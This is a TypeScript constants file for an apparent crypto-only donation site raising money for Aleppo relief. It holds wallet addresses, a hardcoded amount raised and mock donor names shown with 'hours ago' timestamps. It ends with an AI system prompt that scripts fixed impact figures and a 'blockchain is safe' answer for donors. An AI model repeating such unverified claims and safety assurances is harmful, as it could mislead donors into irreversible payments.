
import { CryptoAddress, Donor, ImpactReport } from './types.ts';

export const CAMPAIGN_TARGET = 50000;
export const CURRENT_RAISED = 12500;

export const CRYPTO_ADDRESSES: CryptoAddress[] = [
  {
    label: "USDT (BEP20)",
    network: "Binance Smart Chain (BEP20)",
    address: "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d",
    symbol: "USDT",
    color: "bg-[#26A17B]"
  },
  {
    label: "USDT (TRC20)",
    network: "TRON (TRC20)",
    address: "TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai",
    symbol: "USDT",
    color: "bg-[#26A17B]"
  },
  {
    label: "TRON (TRC20)",
    network: "TRON (TRC20)",
    address: "TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai",
    symbol: "TRX",
    color: "bg-[#FF0013]"
  },
  {
    label: "BITCOIN (BTC)",
    network: "Bitcoin Network",
    address: "3L4CWutLN8PRi6cMNBYVKgmtQTm9V1TQAa",
    symbol: "BTC",
    color: "bg-[#F7931A]"
  }
];

export const MOCK_DONORS: Donor[] = [
  { id: '1', name: 'فاعل خير من الكويت', date: 'منذ ساعتين' },
  { id: '2', name: 'Anonymous Donor', country: 'Germany', date: 'منذ 5 ساعات' },
  { id: '3', name: 'Samer A.', country: 'UAE', date: 'يوم أمس' },
  { id: '4', name: 'فاعل خير', date: 'يوم أمس' },
  { id: '5', name: 'Syrian Diaspora Group', country: 'USA', date: 'منذ يومين' },
  { id: '6', name: 'Laila K.', country: 'Lebanon', date: 'منذ 3 أيام' },
];

export const IMPACT_REPORTS: ImpactReport[] = [
  {
    id: 'r1',
    date: 'مارس 2024',
    title: 'توزيع 500 سلة غذائية',
    description: 'تم بحمد الله توزيع سلال غذائية متكاملة للأسر الأكثر تضرراً في حي الشيخ مقصود.',
    imageUrl: 'https://picsum.photos/seed/food/800/400',
    category: 'food'
  },
  {
    id: 'r2',
    date: 'فبراير 2024',
    title: 'دعم المركز الطبي المحلي',
    description: 'توفير أدوية حيوية ومستلزمات طبية طارئة لأقسام الإسعاف.',
    imageUrl: 'https://picsum.photos/seed/med/800/400',
    category: 'medicine'
  }
];

export const NAV_LINKS = [
  { name: 'الرئيسية', href: '#home' },
  { name: 'عن الحملة', href: '#about' },
  { name: 'أين تذهب التبرعات؟', href: '#where' },
  { name: 'الأثر والتقارير', href: '#impact' },
  { name: 'فاعلو الخير', href: '#donors' },
  { name: 'تبرع الآن', href: '#donate', primary: true },
];

export const AI_SYSTEM_INSTRUCTION = `
You are a compassionate, professional, and transparent AI assistant for the "Ghaouth Halab" (Aleppo Relief) humanitarian platform. 
Your goal is to answer donor questions about the campaign for the Sheikh Maqsoud neighborhood in Aleppo, Syria.

Key Facts to use in answers:
- Current amount raised: $12,500.
- Target: $50,000 for "Winter Emergency Relief".
- Beneficiaries: 450 families so far.
- Impact: 2,800 warm meals provided.
- Donations: Crypto-only (USDT BEP20/TRC20, TRX, BTC) to ensure speed and bypass traditional banking hurdles in conflict zones.
- Focus areas: Food baskets, Medicines, Winter heating fuel/wood.
- Tone: Empathetic, urgent but hopeful, highly transparent.
- Language: Always respond in Arabic (Modern Standard Arabic or Levantine dialect if appropriate).

If someone asks "How can I help?", guide them to the 'Donate' section.
If someone asks "Is this safe?", explain that blockchain provides a transparent trail and direct delivery.
`;
